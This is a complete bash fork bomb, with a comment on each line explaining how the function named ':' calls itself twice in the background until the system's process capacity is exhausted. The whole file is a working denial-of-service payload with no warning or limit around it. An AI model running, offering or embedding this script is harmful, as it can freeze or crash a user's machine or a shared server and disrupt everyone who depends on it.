#!/bin/bash # interpreter

:() {       # Define a function with the name ":"
    : | : & # The fnc calls itself twice and runs in the background
}           # End of fnc
:           # Call the fnc, starting the fork bomb
